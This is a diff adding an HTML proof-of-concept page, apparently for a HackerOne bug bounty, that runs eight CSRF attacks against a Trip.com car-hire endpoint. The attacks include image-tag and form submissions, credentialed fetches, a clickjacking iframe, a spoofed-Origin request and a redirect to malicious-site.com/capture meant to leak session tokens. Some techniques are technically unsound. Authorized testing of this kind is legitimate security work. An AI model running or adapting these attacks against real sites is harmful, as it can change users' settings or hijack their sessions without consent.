@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Vulnerability Test Page for Trip.com</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        button { padding: 10px 20px; margin: 10px; cursor: pointer; }
+        h2 { margin-top: 20px; }
+        .test-section { border: 1px solid #ccc; padding: 15px; margin-bottom: 20px; }
+        #log { white-space: pre-wrap; background: #f0f0f0; padding: 10px; }
+    </style>
+</head>
+<body>
+    <h1>CSRF Vulnerability Test Page for Trip.com</h1>
+    <p>Test CSRF vulnerabilities on <a href="https://au.trip.com/carhire/online/home/?locale=en-AU&curr=USD">Trip.com car hire endpoint</a> within HackerOne scope. Host locally and monitor server logs.</p>
+    <div id="log">Test logs will appear here...</div>
+
+    <!-- Test 1: GET-based CSRF (Currency Change) -->
+    <div class="test-section">
+        <h2>Test 1: GET-based CSRF (Currency Change)</h2>
+        <p>Attempts to change currency to USD via GET request.</p>
+        <button onclick="triggerGetCsrf()">Trigger GET CSRF</button>
+        <script>
+            async function triggerGetCsrf() {
+                const url = 'https://au.trip.com/carhire/online/home/?locale=en-AU&curr=USD';
+                const img = new Image();
+                img.src = url;
+                document.body.appendChild(img);
+                log(`Triggered GET CSRF to ${url}`);
+                // Log response status
+                try {
+                    const response = await fetch(url, { credentials: 'include' });
+                    log(`Response: ${response.status} ${response.statusText}`);
+                } catch (e) {
+                    log(`Error: ${e.message}`);
+                }
+            }
+        </script>
+        <p><strong>Test Notes</strong>: If the endpoint changes currency without a token, an attacker could embed this in an img tag.</p>
+    </div>
+
+    <!-- Test 2: POST-based CSRF (Currency Change) -->
+    <div class="test-section">
+        <h2>Test 2: POST-based CSRF (Currency Change)</h2>
+        <p>Attempts to change currency via POST form.</p>
+        <form id="csrfPostForm" action="https://au.trip.com/carhire/online/home/" method="POST">
+            <input type="hidden" name="locale" value="en-AU">
+            <input type="hidden" name="curr" value="USD">
+            <button type="submit">Trigger POST CSRF</button>
+        </form>
+        <script>
+            document.getElementById('csrfPostForm').addEventListener('submit', () => {
+                log('Triggered POST CSRF to https://au.trip.com/carhire/online/home/');
+            });
+        </script>
+        <p><strong>Test Notes</strong>: Tests if POST requests bypass GET-based protections.</p>
+    </div>
+
+    <!-- Test 3: JSON-based CSRF (API Currency Change) -->
+    <div class="test-section">
+        <h2>Test 3: JSON-based CSRF (API Currency Change)</h2>
+        <p>Attempts to change currency via JSON POST to a hypothetical API.</p>
+        <button onclick="triggerJsonCsrf()">Trigger JSON CSRF</button>
+        <script>
+            async function triggerJsonCsrf() {
+                const url = 'https://au.trip.com/carhire/online/home/';
+                const data = { locale: 'en-AU', curr: 'USD' };
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data),
+                        credentials: 'include'
+                    });
+                    log(`Triggered JSON CSRF to ${url}\nResponse: ${response.status} ${response.statusText}`);
+                } catch (e) {
+                    log(`Error: ${e.message}`);
+                }
+            }
+        </script>
+        <p><strong>Test Notes</strong>: Tests if API endpoints accept JSON without CSRF tokens.</p>
+    </div>
+
+    <!-- Test 4: XSS-triggered CSRF -->
+    <div class="test-section">
+        <h2>Test 4: XSS-triggered CSRF</h2>
+        <p>Simulates XSS injecting a currency change form.</p>
+        <button onclick="triggerXssCsrf()">Trigger XSS CSRF</button>
+        <script>
+            function triggerXssCsrf() {
+                const form = document.createElement('form');
+                form.method = 'POST';
+                form.action = 'https://au.trip.com/carhire/online/home/';
+                form.innerHTML = `
+                    <input type="hidden" name="locale" value="en-AU">
+                    <input type="hidden" name="curr" value="USD">
+                `;
+                document.body.appendChild(form);
+                form.submit();
+                log('Triggered XSS CSRF form submission');
+            }
+        </script>
+        <p><strong>Test Notes</strong>: If Trip.com has XSS (e.g., in search fields), this could trigger CSRF.</p>
+    </div>
+
+    <!-- Test 5: Clickjacking CSRF -->
+    <div class="test-section">
+        <h2>Test 5: Clickjacking CSRF</h2>
+        <p>Tests clickjacking to trigger currency change via iframe.</p>
+        <button onclick="triggerClickjacking()">Show Clickjacking CSRF</button>
+        <div id="clickjackingFrame" style="display:none;">
+            <iframe src="https://au.trip.com/carhire/online/home/?locale=en-AU&curr=USD" style="opacity:0.1; position:absolute; top:100px; left:100px; width:200px; height:50px;"></iframe>
+            <button style="position:absolute; top:100px; left:100px;">Click Me!</button>
+        </div>
+        <script>
+            function triggerClickjacking() {
+                document.getElementById('clickjackingFrame').style.display = 'block';
+                log('Displayed clickjacking iframe');
+            }
+        </script>
+        <p><strong>Test Notes</strong>: Tests if X-Frame-Options or CSP allows iframe embedding.</p>
+    </div>
+
+    <!-- Test 6: CORS-based CSRF -->
+    <div class="test-section">
+        <h2>Test 6: CORS-based CSRF</h2>
+        <p>Tests if CORS misconfiguration allows unauthorized currency change.</p>
+        <button onclick="triggerCorsCsrf()">Trigger CORS CSRF</button>
+        <script>
+            async function triggerCorsCsrf() {
+                const url = 'https://au.trip.com/carhire/online/home/';
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                            'Origin': 'http://malicious-site.com'
+                        },
+                        body: 'locale=en-AU&curr=USD',
+                        credentials: 'include'
+                    });
+                    log(`Triggered CORS CSRF to ${url}\nResponse: ${response.status} ${response.statusText}`);
+                } catch (e) {
+                    log(`Error: ${e.message}`);
+                }
+            }
+        </script>
+        <p><strong>Test Notes</strong>: If CORS allows untrusted origins, attackers could send cross-origin requests.</p>
+    </div>
+
+    <!-- Test 7: Form-action CSRF -->
+    <div class="test-section">
+        <h2>Test 7: Form-action CSRF</h2>
+        <p>Tests if form-action attribute can trigger currency change.</p>
+        <button form="formActionCsrf" type="submit">Trigger Form-action CSRF</button>
+        <form id="formActionCsrf" action="https://au.trip.com/carhire/online/home/" formaction="https://au.trip.com/carhire/online/home/?locale=en-AU&curr=USD">
+            <input type="hidden" name="locale" value="en-AU">
+            <input type="hidden" name="curr" value="USD">
+        </form>
+        <script>
+            document.getElementById('formActionCsrf').addEventListener('submit', () => {
+                log('Triggered Form-action CSRF');
+            });
+        </script>
+        <p><strong>Test Notes</strong>: Tests if form-action overrides allow CSRF via non-standard form submission.</p>
+    </div>
+
+    <!-- Test 8: Session Hijacking CSRF -->
+    <div class="test-section">
+        <h2>Test 8: Session Hijacking CSRF</h2>
+        <p>Tests if currency change leaks session data via redirect.</p>
+        <button onclick="triggerSessionCsrf()">Trigger Session CSRF</button>
+        <script>
+            async function triggerSessionCsrf() {
+                const url = 'https://au.trip.com/carhire/online/home/?locale=en-AU&curr=USD&redirect=http://malicious-site.com/capture';
+                const img = new Image();
+                img.src = url;
+                document.body.appendChild(img);
+                log(`Triggered Session CSRF to ${url}`);
+            }
+        </script>
+        <p><strong>Test Notes</strong>: If redirects leak session tokens in Referer or URL, attackers could hijack sessions.</p>
+    </div>
+
+    <script>
+        function log(message) {
+            const logDiv = document.getElementById('log');
+            logDiv.textContent += message + '\n';
+            // Send log to server
+            fetch('/log', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ message })
+            });
+        }
+    </script>
+</body>
+</html>
